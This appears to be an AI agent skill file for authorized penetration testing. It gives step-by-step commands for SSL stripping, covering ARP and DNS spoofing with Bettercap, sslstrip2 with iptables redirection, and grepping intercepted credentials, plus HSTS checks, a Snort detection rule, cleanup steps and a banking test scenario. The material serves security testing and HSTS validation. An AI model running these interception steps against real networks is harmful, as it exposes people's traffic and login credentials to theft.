---
name: performing-ssl-stripping-attack
description: Simulates SSL stripping / HTTPS downgrade attacks using sslstrip, Bettercap, and mitmproxy in authorized lab environments to test HSTS enforcement, certificate validation, and HTTPS upgrade mechanisms.
subdomain: network-security
facing: config
mitre_attack:
- T1046
- T1040
- T1557
- T1071
- T1573
nist_csf:
- PR.IR-01
- DE.CM-01
- ID.AM-03
- PR.DS-02
upstream: performing-ssl-stripping-attack@54a7988 Apache-2.0, modified by wesh
---
> Authorized use only: written scope / rules of engagement first. Refuse targets outside scope.
> Legal: This skill is for authorized security testing and educational purposes only. Unauthorized use against systems you do not own or have written permission to test is illegal and may violate computer fraud laws.

Not for: networks or applications without explicit written authorization, to intercept real user credentials, or against production systems during business hours without change management approval.

## Prerequisites

- Written authorization specifying in-scope applications and approved attack techniques
- Bettercap 2.x or sslstrip2 installed on attacker machine
- ARP spoofing or other MITM positioning established (see ARP spoofing skill)
- IP forwarding enabled on attacker machine
- Wireshark for verifying attack success and capturing evidence
- Test accounts (not real user credentials) for demonstrating credential interception

## Workflow

### Step 1: Establish MITM Position

```bash
# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Position via ARP spoofing using Bettercap
sudo bettercap -iface eth0 -eval "set arp.spoof.targets 192.168.1.50; arp.spoof on"

# Alternatively, use arpspoof from dsniff
sudo arpspoof -i eth0 -t 192.168.1.50 -r 192.168.1.1 &
```

### Step 2: Execute SSL Stripping with Bettercap

```bash
# Start Bettercap with SSL stripping
sudo bettercap -iface eth0

# Enable ARP spoofing
> set arp.spoof.targets 192.168.1.50
> set arp.spoof.fullduplex true
> arp.spoof on

# Enable HTTP proxy with SSL stripping
> set http.proxy.sslstrip true
> set http.proxy.port 8080
> http.proxy on

# Enable network sniffer for credential capture
> set net.sniff.verbose true
> net.sniff on

# Watch for intercepted HTTP traffic (was HTTPS)
# Bettercap will show credentials and URLs in real-time
```

### Step 3: Execute SSL Stripping with sslstrip2

```bash
# Configure iptables to redirect HTTP traffic through sslstrip
sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000

# Start sslstrip
sudo sslstrip2 -l 10000 -w sslstrip_log.txt

# In another terminal, monitor the log for intercepted credentials
tail -f sslstrip_log.txt | grep -i "pass\|user\|login\|email"

# sslstrip works by:
# 1. Intercepting HTTP responses containing HTTPS links
# 2. Replacing https:// with http:// in the response
# 3. Maintaining HTTPS connection to the real server
# 4. Serving downgraded HTTP to the victim
```

### Step 4: Test HSTS Bypass Techniques

```bash
# Check if target has HSTS header
curl -sI https://target-app.example.com | grep -i strict-transport-security

# Check if target is on the HSTS preload list
curl -s "https://hstspreload.org/api/v2/status?domain=example.com" | python3 -m json.tool

# Test HSTS bypass via subdomain substitution
# sslstrip2 can replace URLs with similar-looking HTTP alternatives:
# https://accounts.google.com -> http://accounts.google.com (fails if HSTS)
# https://accounts.google.com -> http://accounts.google.com. (trailing dot bypass attempt)

# Bettercap HSTS bypass with DNS spoofing
sudo bettercap -iface eth0
> set arp.spoof.targets 192.168.1.50
> arp.spoof on
> set dns.spoof.domains target-app.example.com
> set dns.spoof.address 192.168.1.99
> dns.spoof on
> set http.proxy.sslstrip true
> http.proxy on

# For applications not on HSTS preload, clear HSTS cache in test browser:
# Chrome: chrome://net-internals/#hsts -> Delete domain security policies
# Firefox: Clear recent history -> Active Logins (resets HSTS)
```

### Step 5: Validate Detection and Controls

```bash
# Check from victim's perspective:
# 1. Browser address bar should show http:// instead of https://
# 2. No padlock icon visible
# 3. If HSTS is effective, browser should show error and refuse connection

# Capture evidence of the downgrade
tshark -i eth0 -f "host 192.168.1.50 and port 80" \
  -T fields -e frame.time -e ip.src -e ip.dst -e http.host -e http.request.uri \
  -Y "http.request" > ssl_strip_evidence.txt

# Verify what the victim sees vs what goes to the real server
# Victim to attacker: HTTP (port 80, cleartext)
tshark -i eth0 -f "src host 192.168.1.50 and dst port 80" -c 20

# Attacker to real server: HTTPS (port 443, encrypted)
tshark -i eth0 -f "dst port 443 and dst host <real_server_ip>" -c 20

# Check IDS/SIEM for detection
# Snort rule that should detect SSL stripping indicators:
# alert tcp any any -> $HOME_NET 80 (msg:"Possible SSL Strip - Login form over HTTP";
#   flow:to_client,established; content:"type=\"password\""; nocase;
#   content:"http://"; nocase; sid:9000010;)

# Check for HSTS missing header alerts
curl -s http://target-app.example.com | grep -i "password\|login"
# If login form is served over HTTP, SSL stripping succeeded
```

### Step 6: Clean Up and Report

```bash
# Stop SSL stripping
# In Bettercap:
> http.proxy off
> arp.spoof off
> quit

# Remove iptables rules
sudo iptables -t nat -F PREROUTING

# Disable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=0

# Kill background processes
sudo killall sslstrip2 arpspoof 2>/dev/null

# Verify network is restored
ping -c 1 192.168.1.1
```

## Key Concepts

| Term | Definition |
|------|------------|
| **SSL Stripping** | Downgrade attack that intercepts HTTP-to-HTTPS redirects, maintaining encrypted connection to server while serving cleartext HTTP to victim |
| **HSTS (HTTP Strict Transport Security)** | HTTP response header that instructs browsers to only connect via HTTPS for specified duration, preventing SSL stripping in subsequent visits |
| **HSTS Preloading** | Submission of domains to browser-maintained lists that enforce HTTPS from very first connection, closing first-visit vulnerability window |
| **Certificate Transparency** | Public logging framework for TLS certificates that enables detection of misissued certificates but does not prevent SSL stripping |
| **Mixed Content** | Web pages served over HTTPS that load resources (scripts, images) over HTTP, creating partial downgrade vulnerability |
| **Upgrade-Insecure-Requests** | CSP directive that instructs browsers to upgrade HTTP requests to HTTPS, complementing HSTS for mixed content prevention |

## Tools & Systems

- **Bettercap 2.x**: Network attack framework with integrated SSL stripping, HTTP/HTTPS proxying, and credential sniffing
- **sslstrip2**: Dedicated SSL stripping tool that transparently downgrades HTTPS to HTTP with URL rewriting
- **mitmproxy**: TLS-intercepting proxy that can modify response headers to remove HSTS and other security headers
- **curl**: Command-line tool for testing HSTS headers, redirect chains, and certificate validation
- **hstspreload.org**: Public HSTS preload list checker for verifying domain inclusion in browser preload databases

### Scenario: Testing HSTS Implementation on Banking Web Application

**Context**: Bank deployed HSTS on their online banking portal (banking.example.com) six months ago and wants to verify it effectively prevents SSL stripping. Assessment is authorized to test from workstation on same VLAN as test environment using dedicated test accounts.

**Approach**:
1. Verify HSTS header presence and values: `curl -sI https://banking.example.com | grep -i strict` reveals `max-age=31536000; includeSubDomains; preload`
2. Check HSTS preload status: confirmed domain is on Chrome and Firefox preload lists
3. Set up Bettercap with ARP spoofing and SSL stripping against test workstation
4. Attempt to access banking.example.com from test workstation -- Chrome refuses connection with NET::ERR_CERT_AUTHORITY_INVALID (HSTS prevents downgrade)
5. Test with fresh browser profile (no HSTS cache) -- still blocked because domain is preloaded
6. Test bank's mobile app -- app successfully connects over HTTP (does not enforce HSTS), exposing credentials in cleartext
7. Test subdomain api.banking.example.com -- not on preload list, SSL stripping succeeds on first visit before HSTS header is cached

**Pitfalls**:
- Testing with browser that already has HSTS cached for target domain and concluding HSTS works, when first-time visitor might be vulnerable
- Not testing subdomains separately -- `includeSubDomains` only works after parent domain's HSTS header is received
- Forgetting to test mobile applications which may not respect HSTS headers at all
- Not checking for mixed content that could leak session tokens even with HSTS enabled

Not vendored (scripts/, references/): https://github.com/mukul975/Anthropic-Cybersecurity-Skills/tree/54a798831d2266a3ca61ce68a7acb80b81160d57/skills/performing-ssl-stripping-attack
